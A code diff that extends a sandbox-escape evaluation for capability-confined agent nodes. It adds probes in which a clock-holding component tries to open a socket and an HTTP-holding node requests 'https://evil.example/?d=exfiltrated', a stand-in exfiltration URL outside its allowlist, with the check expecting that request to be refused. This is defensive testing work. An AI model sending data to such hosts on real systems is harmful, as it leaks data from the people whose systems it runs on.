@@ -47,10 +47,18 @@ from .graph import (
     validate_graph_dict,
     validate_graph_dicts,
 )
-from .handles import CapabilityError, ToolLLM
+from .handles import CapabilityError, Clock, HTTPClient, Notifier, ToolLLM, WallTime
 from .llm import LLMRequest, LLMResponse, StubLLM, ToolCall
 from .runtime import execute
-from .sandbox import INFERENCE_LLM, TOOL_LLM, SandboxError, available
+from .sandbox import (
+    CAPABILITY_INTERFACES,
+    CAPABILITY_KINDS,
+    CLOCK,
+    INFERENCE_LLM,
+    TOOL_LLM,
+    SandboxError,
+    available,
+)
 from .sandbox.bench import (
     ENVELOPE_CROSSING_MS,
     ENVELOPE_MAX_OVERHEAD,
@@ -59,6 +67,8 @@ from .sandbox.bench import (
     measure,
 )
 from .sandbox.host import Sandbox, capability_imports, wasi_imports
+from .sandbox.host import record as _record
+from .sandbox.nodes import heartbeat_sandbox
 from .trace import GraphTrace, validate_document
 from .values import ConversationContext, CustomerRequest, Untrusted
 from .variants import UNSAFE_VARIANTS
@@ -447,6 +457,33 @@ def probe_escapes() -> list[Escape]:
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     sock.close()
 
+    # A clock-holding hostile component: one deliberately-granted WASI interface,
+    # and the same ambient escapes as the empty-handed one. On the host tier the
+    # analogous node reaches around its handles ambiently, so that column stays
+    # ESCAPES; on the confined tier the grant buys the clock and nothing else.
+    def _clocked(export: str) -> bool:
+        clock = Clock(_source=lambda: WallTime(seconds=0, nanoseconds=0))
+
+        def now():
+            t = clock.now()
+            return _record(seconds=t.seconds, nanoseconds=t.nanoseconds)
+
+        return bool(Sandbox("hostile_clocked", {CLOCK: {"now": now}}).call(export).escaped)
+
+    # An HTTP-holding node asking for a host outside its allowlist: the crossing
+    # refuses it (the allowlist lives in the handle, as a tool scope does). A
+    # host-tier node reaches the same host ambiently, so that column is ESCAPES.
+    offlist_refused = False
+    try:
+        heartbeat_sandbox(
+            "https://evil.example/?d=exfiltrated",
+            Clock(_source=lambda: WallTime(seconds=0, nanoseconds=0)),
+            HTTPClient(allowlist=frozenset({"feeds.example.com"})),
+            Notifier(channel="digest"),
+        )
+    except CapabilityError:
+        offlist_refused = True
+
     return [
         Escape(
             "read a file",
@@ -472,6 +509,20 @@ def probe_escapes() -> list[Escape]:
             not ungranted_denied,
             "the component imports an interface it was never granted, so it cannot "
             "instantiate — the refusal lands before any guest code runs",
+        ),
+        Escape(
+            "open a socket, holding a clock",
+            True,
+            _clocked("escape-net"),
+            "one deliberately granted WASI interface (wasi:clocks/wall-clock) does "
+            "not reopen the ambient world — the grant buys the clock and nothing else",
+        ),
+        Escape(
+            "fetch outside the HTTP allowlist",
+            True,
+            not offlist_refused,
+            "the confined node holds the operation; the allowlist lives in the "
+            "handle, and the out-of-list request is refused at the crossing",
         ),
     ]
 
@@ -706,6 +757,19 @@ def render(
         f"the artifact, not of how the host happened to configure it."
     )
     lines.append("")
+    clock_imports = capability_imports("hostile_clocked")
+    lines.append(
+        f"The dual demonstration: a node whose `with` clause names `Clock` imports "
+        f"exactly `{clock_imports[0]}` — the *upstream WASI interface*, granted as a "
+        f"capability like any other — and its ambient import count (imports **not** "
+        f"granted as capabilities) is still {len(wasi_imports('hostile_clocked'))}. The "
+        f"boundary between capability and ambient authority is the `with` clause, not "
+        f"the package namespace. The import-set derivation now covers "
+        f"{len(CAPABILITY_KINDS)} capability kinds realised by "
+        f"{len(CAPABILITY_INTERFACES)} typed interfaces, each derived from the graph "
+        f"type by the same mapping."
+    )
+    lines.append("")
     lines.append(
         "**Fidelity.** Enforcement is unforgeable at the WASM boundary, not at the memory "
         "level; CHERI remains a named follow-up. Only the nodes ported to the sandbox tier "
@@ -864,6 +928,18 @@ def serialise(ev: Evaluation) -> str:
             ],
             "inference_node_imports": list(inference_imports),
             "ambient_imports": len(wasi_imports("node_parse_message")),
+            # The capability vocabulary the derivation is evidence about: graph-level
+            # kinds and the WIT interfaces realising them, counted from the registry
+            # rather than typed into prose. The clock rows pin the sharp case — a
+            # node granted `Clock` imports exactly the upstream WASI wall-clock
+            # interface, and the ambient count (imports NOT granted as capabilities)
+            # is still zero, because the `with` clause, not the namespace, is the
+            # boundary between capability and ambient authority.
+            "capability_kinds": len(CAPABILITY_KINDS),
+            "capability_interfaces": len(CAPABILITY_INTERFACES),
+            "clock_node_imports": list(capability_imports("hostile_clocked")),
+            "clock_node_ambient_imports": len(wasi_imports("hostile_clocked")),
+            "heartbeat_imports": list(capability_imports("node_heartbeat")),
         },
         # The execution trace, as a reported fact of §3. The traces themselves are
         # emitted to dist/trace-injection-{host,confined}.json; these are the pinned
